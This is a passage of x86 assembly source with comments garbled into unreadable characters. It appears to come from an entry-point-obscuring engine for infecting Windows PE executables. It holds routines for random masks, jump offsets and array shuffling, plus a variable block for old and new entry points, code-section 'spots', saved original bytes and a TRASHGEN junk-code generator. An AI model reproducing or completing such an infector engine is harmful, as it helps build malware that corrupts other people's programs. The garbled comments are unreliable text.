    pop     ecx   
_reststack_: 
    add     esp,4                               ;pop    edx 
    mov     esp,ebp
    pop     ebp
    loop    _reststack_
    jmp     eax
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ����� FLEA_RESTSTACK
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx     





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;��������������� ������� gen_mask 
;��������� ����� ��� ������ 
;���� (stdcall) (gen_mask(DWORD xmask)):
;   xmask - ��������� ����� 
;�����: 
;   EAX - ����� ����� 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
gen_mask:
    push    ecx
    mov     ecx,dword ptr [esp+08]     
    push    -1 
    call    [ebx].rgen_addr
    and     ecx,eax
    rol     eax,10h 
    push    eax
    call    [ebx].rgen_addr 
    and     ecx,eax   
    xchg    eax,ecx
    pop     ecx
    ret     4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;����� ������� gen_mask 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
    




;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;��������������� ������� get_jmpaddr
;��������� �������� ��� jmp'a, ������� ����� ������� �� ��������� ����� 
;�����:
;��� - ������� �������� 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_jmpaddr:
    push    max_jmp 
    call    [ebx].rgen_addr
    cmp     eax,min_jmp
    jb      get_jmpaddr  
    ret   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ������� get_jmpaddr 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 






;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;��������������� ������� mix_addr
;������������� ��������� ������� ������ � �������
;�������: � ������ ������ ������������ ��� ������������� �������� ������� ������� �����
;���� ( mix_adr(DWORD *addr_mas, DWORD num_elem) ): 
;addr_mas - ����� ������(�������), ��� ��������� ��������, ������� ������� ����������
;num_elem - ���-�� ���� ����� ���������
;�����:
;������������ ������ � ������(�������)    
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
mix_addr:
    pushad                  ;
    mov     ecx,dword ptr [esp+28h]             ;ECX - ���-�� ���������    
    mov     esi,dword ptr [esp+24h]             ;ESI - ����� ������, ��� ��������� ��� ��������  
    xor     edx,edx 
_nxtmix_: 
    push    ecx
    call    [ebx].rgen_addr                     ;�������� �� [0..ECX-1]
    push    dword ptr [esi+edx*4]               ;� ������������     
    push    dword ptr [esi+eax*4]
    pop     dword ptr [esi+edx*4]
    pop     dword ptr [esi+eax*4]
    inc     edx
    cmp     edx,ecx
    jne     _nxtmix_                            ;���� ���������� ��� ��������, �� �� ����� 
            
    popad  
    ret     4*2 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ������� mix_addr
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

  





;========================================================================================================
;��������������� ���������� (��������� � �����) 
;========================================================================================================  
imNTh               equ     dword ptr [ebp-04]  ;��������� �� IMAGE_NT_HEADERS 
old_ep              equ     dword ptr [ebp-08]  ;������ ����� �����
base                equ     dword ptr [ebp-12]  ;ImageBase 
new_ep              equ     dword ptr [ebp-16]  ;����� ����� ����� (� ����� ��������� ������) 
start_addr          equ     dword ptr [ebp-20]  ;���������� ����� ����� ����� (+ ���� ��������)  
codesec             equ     dword ptr [ebp-24]  ;��������� �� ������� ������ � �������� ������ 
size_codesec        equ     dword ptr [ebp-28]  ;������ � ������� ������, ������� ������� ����� ������������ ��� ������ ����� 
max_codesec_addr    equ     dword ptr [ebp-32]  ;������������ ���������� ����� � ������� ������, �� �������� ����� ���������� ����� 
cur_codesec_addr    equ     dword ptr [ebp-36]  ;������� ����� � ������� ������ (������������ ��� ��������� ���������� ������ ������ ��������) 
num_spots           equ     dword ptr [ebp-40]  ;���-�� ������� ���������� ����� � ������� ������ 
beg_rest_bytes      equ     dword ptr [ebp-44]  ;����� ������, ��� �������� ���-�� ���������� �����, ������� ��, ������, � ����� ������������ ����� ������� ������ 
cur_rest_bytes      equ     dword ptr [ebp-48]  ;������� ����� � ������ (�������������� ����������), ���� ��������� ������������ ����� ������� ������ etc 
spot1               equ     dword ptr [ebp-52]  ;������ 1-�� ������ ������ (���� ������ ������ ������ �������, ������� ����� ����� ����������) (����� ��������������� ����������) 
spot2               equ     dword ptr [ebp-56]  ;������ 2-�� ������ ������ etc 
tgen_struct         equ     dword ptr [ebp-60]  ;����� ��������� TRASHGEN (��� �������� xTG - ��� ������� �������)     
xtmask1             equ     dword ptr [ebp-64]  ;����� �����1
xtmask2             equ     dword ptr [ebp-68]  ;����� �����2  

restore_bytes       db      MAX_SPOTS*(uportion1+uportion2+7+10)+MAX_SPOTS*(4+4)+101 dup (00h);�����, �������������� ����� ��������� ���������:   
                                                ;num_spots              db  1               ;���-�� ���������� ����� � ������� ������ 
                                                ;size_spot1             dd  1               ;������ ���������� �����
                                                ;addr_spot1             dd  1               ;����� ���������� ��������              
                                                ;save_bytes1            db  size_spot1      ;����������� ������������ ����� (������ ������� �� � �������� ��������� �����) 
                                                ;size_spot2             dd  1               ;etc 
                                                ;addr_spot2             dd  1
                                                ;save_bytes2            db  size_spot2
                                                ;...
                                                ;size_spot(num_spots)   dd  1
                                                ;addr_spot(num_spots)   dd  1
                                                ;save_bytes(num_spots)  db  size_spot(num_spots) 
   
UEP_RESTBYTES_SIZE  equ     $ - restore_bytes   ;������ ������, ��� ���� 
;========================================================================================================           

